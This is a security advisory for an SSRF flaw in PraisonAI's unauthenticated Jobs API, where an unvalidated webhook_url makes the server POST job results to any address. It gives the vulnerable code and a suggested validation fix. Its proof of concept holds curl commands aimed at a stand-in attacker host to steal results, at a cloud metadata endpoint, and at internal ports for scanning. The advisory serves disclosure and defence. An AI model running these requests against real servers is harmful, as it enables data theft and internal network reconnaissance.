# [H] PraisonAI Vulnerable to Server-Side Request Forgery via Unvalidated webhook_url in Jobs API

## Summary
Severity: High
Advisory: GHSA-8frj-8q3m-xhgm
CVE: CVE-2026-40114
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-8frj-8q3m-xhgm
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
## Summary

The `/api/v1/runs` endpoint accepts an arbitrary `webhook_url` in the request body with no URL validation. When a submitted job completes (success or failure), the server makes an HTTP POST request to this URL using `httpx.AsyncClient`. An unauthenticated attacker can use this to make the server send POST requests to arbitrary internal or external destinations, enabling SSRF against cloud metadata services, internal APIs, and other network-adjacent services.

## Details

The vulnerability exists across the full request lifecycle:

**1. User input accepted without validation** — `models.py:32`:
```python
class JobSubmitRequest(BaseModel):
    webhook_url: Optional[str] = Field(None, description="URL to POST results when complete")
```
The field is a plain `str` with no URL validation — no scheme restriction, no host filtering.

**2. Stored directly on the Job object** — `router.py:80-86`:
```python
job = Job(
    prompt=body.prompt,
    ...
    webhook_url=body.webhook_url,
    ...
)
```

**3. Used in an outbound HTTP request** — `executor.py:385-415`:
```python
async def _send_webhook(self, job: Job):
    if not job.webhook_url:
        return
    try:
        import httpx
        payload = {
            "job_id": job.id,
            "status": job.status.value,
            "result": job.result if job.status == JobStatus.SUCCEEDED else None,
            "error": job.error if job.status == JobStatus.FAILED else None,
            ...
        }
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.post(
                job.webhook_url,    # <-- attacker-controlled URL
                json=payload,
                headers={"Content-Type": "application/json"}
            )
```

**4. Triggered on both success and failure paths** — `executor.py:180-205`:
```python
# Line 180-181: on success
if job.webhook_url:
    await self._send_webhook(job)

# Line 204-205: on failure
if job.webhook_url:
    await self._send_webhook(job)
```

**5. No authentication on the Jobs API server** — `server.py:82-101`:
The `create_app()` function creates a FastAPI app with CORS allowing all origins (`["*"]`) and no authentication middleware. The jobs router is mounted directly with no auth dependencies.

There is zero URL validation anywhere in the chain: no scheme check (allows `http://`, `https://`, and any scheme httpx supports), no private/internal IP filtering, and no allowlist.

## PoC

**Step 1: Start a listener to observe SSRF requests**
```bash
# In a separate terminal, start a simple HTTP listener
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f'Received POST from PraisonAI server:')
        print(json.dumps(json.loads(body), indent=2))
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
"
```

**Step 2: Submit a job with a malicious webhook_url**
```bash
# Point webhook to attacker-controlled server
curl -X POST http://localhost:8005/api/v1/runs \
  -H 'Content-Type: application/json' \
  -d '{
    "prompt": "say hello",
    "webhook_url": "http://attacker.example.com:9999/steal"
  }'
```

**Step 3: Target internal services (cloud metadata)**
```bash
# Attempt to reach AWS metadata service
curl -X POST http://localhost:8005/api/v1/runs \
  -H 'Content-Type: application/json' \
  -d '{
    "prompt": "say hello",
    "webhook_url": "http://169.254.169.254/latest/meta-data/"
  }'
```

**Step 4: Internal network port scanning**
```bash
# Scan internal services by observing response timing
for port in 80 443 5432 6379 8080 9200; do
  curl -s -X POST http://localhost:8005/api/v1/runs \
    -H 'Content-Type: application/json' \
    -d "{
      \"prompt\": \"say hello\",
      \"webhook_url\": \"http://10.0.0.1:${port}/\"
    }"
done
```

When each job completes, the server POSTs the full job result payload (including agent output, error messages, and execution metrics) to the specified URL.

## Impact

1. **SSRF to internal services**: The server will send POST requests to any host/port reachable from the server's network, allowing interaction with internal APIs, databases, and cloud infrastructure that are not meant to be externally accessible.

2. **Cloud metadata access**: In cloud deployments (AWS, GCP, Azure), the server can be directed to POST to metadata endpoints (`169.254.169.254`, `metadata.google.internal`), potentially triggering actions or leaking information depending on the metadata service's POST handling.

3. **Internal network reconnaissance**: By submitting jobs with webhook URLs pointing to various internal hosts and ports, an attacker can discover internal services based on timing differences and error patterns in job logs.

4. **Data exfiltration**: The webhook payload includes the full job result (agent output), which may contain sensitive data processed by the agent. By pointing the webhook to an attacker-controlled server, this data is exfiltrated.

5. **No authentication barrier**: The Jobs API server has no authentication by default, meaning any network-reachable attacker can exploit this without credentials.

## Recommended Fix

Add URL validation to restrict webhook URLs to safe destinations. In `models.py`, add a Pydantic validator:

```python
from pydantic import BaseModel, Field, field_validator
from urllib.parse import urlparse
import ipaddress

class JobSubmitRequest(BaseModel):
    webhook_url: Optional[str] = Field(None, description="URL to POST results when complete")

    @field_validator("webhook_url")
    @classmethod
    def validate_webhook_url(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        
        parsed = urlparse(v)
        
        # Only allow http and https schemes
        if parsed.scheme not in ("http", "https"):
            raise ValueError("webhook_url must use http or https scheme")
        
        # Block private/internal IP ranges
        hostname = parsed.hostname
        if not hostname:
            raise ValueError("webhook_url must have a valid hostname")
        
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
                raise ValueError("webhook_url must not point to private/internal addresses")
        except ValueError as e:
            if "must not point" in str(e):
                raise
            # hostname is not an IP — resolve and check
            pass
        
        return v
```

Additionally, in `executor.py`, add DNS resolution validation before making the request to prevent DNS rebinding:

```python
async def _send_webhook(self, job: Job):
    if not job.webhook_url:
        return
    
    # Validate resolved IP is not private (prevent DNS rebinding)
    from urllib.parse import urlparse
    import socket, ipaddress
    
    parsed = urlparse(job.webhook_url)
    try:
        resolved_ip = socket.getaddrinfo(parsed.hostname, parsed.port or 443)[0][4][0]
        ip = ipaddress.ip_address(resolved_ip)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            logger.warning(f"Webhook blocked for {job.id}: resolved to private IP {resolved_ip}")
            return
    except (socket.gaierror, ValueError):
        logger.warning(f"Webhook blocked for {job.id}: could not resolve {parsed.hostname}")
        return
    
    # ... proceed with httpx.AsyncClient.post() ...
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8frj-8q3m-xhgm
- https://nvd.nist.gov/vuln/detail/CVE-2026-40114
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
